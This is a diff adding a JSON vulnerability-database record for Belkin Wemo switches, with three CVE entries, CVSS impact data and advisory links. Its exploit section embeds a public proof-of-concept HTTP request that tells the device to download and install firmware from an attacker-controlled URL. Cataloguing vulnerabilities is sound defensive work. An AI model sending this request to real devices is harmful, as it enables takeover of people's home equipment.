@@ -1,0 +1,236 @@
+{
+    "ves": {
+        "ves:product": {
+            "product": "Belkin Wemo switch",
+            "manufacturer": "Belkin",
+            "models": {
+                "belkin_wemo": {
+                    "vulnerability": [
+                        "CVE-2019-17094",
+                        "CVE-2013-2748",
+                        "CVE-2019-17532"
+                    ],
+                    "exploit": [
+                        "24924"
+                    ]
+                }
+            }
+        },
+        "ves:vulnerability": {
+            "CVE-2019-17094": {
+                "basic-info": {
+                    "description": [
+                        "A Stack-based Buffer Overflow vulnerability in libbelkin_api.so component of Belkin WeMo Insight Switch firmware allows a local attacker to obtain code execution on the device. This issue affects: Belkin WeMo Insight Switch firmware version 2.00.11396 and prior versions."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "27-Jan-2020",
+                        "nvd-last-modified": "04-Feb-2020"
+                    },
+                    "impact-score": " 5.9 ",
+                    "exploitability-score": " 1.8 ",
+                    "cwe-id": "CWE-787",
+                    "cwe": "Out-of-bounds Write",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/787.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2019-17094",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:belkin:wemo_insight_switch_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (excluding) 2.00.11396 "
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:belkin:wemo_insight_switch:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {
+                    "ves:exploitability-info": {
+                        "attack-vector": "Local",
+                        "attack-complexity": "Low",
+                        "privileges-requires": "Low",
+                        "user-interaction": "None",
+                        "scope": "Unchanged"
+                    },
+                    "ves:impact-info": {
+                        "confidentiality": "High",
+                        "integrity": "High",
+                        "availability": "High"
+                    }
+                }
+            },
+            "CVE-2013-2748": {
+                "basic-info": {
+                    "description": [
+                        "Belkin Wemo Switch before WeMo_US_2.00.2176.PVT could allow remote attackers to upload arbitrary files onto the system."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "28-Jan-2020",
+                        "nvd-last-modified": "05-Feb-2020"
+                    },
+                    "impact-score": " 5.9 ",
+                    "exploitability-score": " 3.9 ",
+                    "cwe-id": "CWE-434",
+                    "cwe": "Unrestricted Upload of File with Dangerous Type",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/434.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2013-2748",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:belkin:wemo_switch_firmware:*:*:*:*:*:*:*:*",
+                            "CPE-range": " versions up to (excluding) wemo_us_2.00.2176.pvt "
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:belkin:wemo_switch:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {
+                    "ves:exploitability-info": {
+                        "attack-vector": "Network",
+                        "attack-complexity": "Low",
+                        "privileges-requires": "None",
+                        "user-interaction": "None",
+                        "scope": "Unchanged"
+                    },
+                    "ves:impact-info": {
+                        "confidentiality": "High",
+                        "integrity": "High",
+                        "availability": "High"
+                    }
+                }
+            },
+            "CVE-2019-17532": {
+                "basic-info": {
+                    "description": [
+                        "An issue was discovered on Belkin Wemo Switch 28B WW_2.00.11057.PVT-OWRT-SNS devices. They allow remote attackers to cause a denial of service (persistent rules-processing outage) via a crafted ruleDbBody element in a StoreRules request to the upnp/control/rules1 URI, because database corruption occurs."
+                    ],
+                    "vulnerability-timestamps": {
+                        "nvd-published": "12-Oct-2019",
+                        "nvd-last-modified": "21-Jul-2021"
+                    },
+                    "impact-score": " 3.6 ",
+                    "exploitability-score": " 3.9 ",
+                    "cwe-id": "CWE-306",
+                    "cwe": "Missing Authentication for Critical Function",
+                    "cwe-link": [
+                        "http://cwe.mitre.org/data/definitions/306.html"
+                    ],
+                    "cve-url": "https://nvd.nist.gov//vuln/detail/CVE-2019-17532",
+                    "affected-product-versions": {
+                        "CPE-1": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:o:belkin:wemo_switch_28b_firmware:wemo_ww_2.00.11057.pvt-owrt-sns:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        },
+                        "CPE-2": {
+                            "CPE-version": "2.3",
+                            "CPE-uri": "cpe:2.3:h:belkin:wemo_switch_28b:-:*:*:*:*:*:*:*",
+                            "CPE-range": "NA"
+                        }
+                    }
+                },
+                "evaluation": {
+                    "ves:exploitability-info": {
+                        "attack-vector": "Network",
+                        "attack-complexity": "Low",
+                        "privileges-requires": "None",
+                        "user-interaction": "None",
+                        "scope": "Unchanged"
+                    },
+                    "ves:impact-info": {
+                        "confidentiality": "None",
+                        "integrity": "None",
+                        "availability": "High"
+                    }
+                }
+            }
+        },
+        "ves:exploit": {
+            "24924": {
+                "exploit-title": "Belkin Wemo - Arbitrary Firmware Upload",
+                "platform": "Hardware",
+                "exploit-timestamps": {
+                    "created": "NA",
+                    "edb-published": "08-Apr-2013"
+                },
+                "cve": [
+                    "CVE-2013-2748"
+                ],
+                "content": [
+                    "\\'# Exploit Title: Belkin Wemo Arbitrary Firmware Vulnerability\\\\r\\\n# Date: 4/3/13\\\\r\\\n# Exploit Author: Daniel Buentello\\\\r\\\n# Vendor Homepage: http://www.belkin.com/us/wemo\\\\r\\\n# Version: Any version prior to WeMo_US_2.00.2176.PVT\\\\r\\\n# CVE : CVE-2013-2748\\\\r\\\n\\\\r\\\n\\\\r\\\nPOST /upnp/control/firmwareupdate1 HTTP/1.1\\\\r\\\nSOAPACTION: \"urn:Belkin:service:firmwareupdate:1#UpdateFirmware\"\\\\r\\\nContent-Length: \\\\r\\\nContent-Type: text/xml; charset=\"utf-8\"\\\\r\\\nHOST: 10.0.1.8:49153\\\\r\\\nUser-Agent: \\\\r\\\n\\\\r\\\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\\\\r\\\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\\\\r\\\n <s:Body>\\\\r\\\n  <u:UpdateFirmware xmlns:u=\"urn:Belkin:service:firmwareupdate:1\">\\\\r\\\n   <ReleaseDate>07Jan2013</ReleaseDate><NewFirmwareVersion>1</NewFirmwareVersion><URL>http://10.0.1.99/bad_firmware.bin\\\\r\\\n  </u:UpdateFirmware>\\\\r\\\n </s:Body>\\\\r\\\n</s:Envelope>\\\\r\\\n\\\\r\\\nPoC Video:\\\\r\\\nhttps://www.youtube.com/watch?v=BcW2q0aHOFo\\"
+                ]
+            }
+        },
+        "ves:solution": {
+            "CVE-2019-17094": {
+                "solution-1": {
+                    "url": "https://labs.bitdefender.com/2019/12/multiple-vulnerabilities-in-belkin-wemo-insight-switch/",
+                    "type": "Third Party Advisory",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "04-Feb-2020",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2013-2748": {
+                "solution-1": {
+                    "url": "http://www.exploit-db.com/exploits/24924",
+                    "type": "Exploit, Third Party Advisory, VDB Entry",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "05-Feb-2020",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-2": {
+                    "url": "http://www.securityfocus.com/bid/58929",
+                    "type": "Third Party Advisory, VDB Entry",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "05-Feb-2020",
+                        "nvd-updated": "NA"
+                    }
+                },
+                "solution-3": {
+                    "url": "https://exchange.xforce.ibmcloud.com/vulnerabilities/83296",
+                    "type": "Third Party Advisory, VDB Entry",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "01-Jan-2013",
+                        "last-updated": "NA",
+                        "nvd-indexed": "05-Feb-2020",
+                        "nvd-updated": "NA"
+                    }
+                }
+            },
+            "CVE-2019-17532": {
+                "solution-1": {
+                    "url": "https://github.com/badnack/wemo_dos",
+                    "type": "Exploit, Third Party Advisory",
+                    "isPatch:": "No",
+                    "solution-timestamps": {
+                        "created": "NA",
+                        "last-updated": "NA",
+                        "nvd-indexed": "17-Oct-2019",
+                        "nvd-updated": "NA"
+                    }
+                }
+            }
+        }
+    }
+}
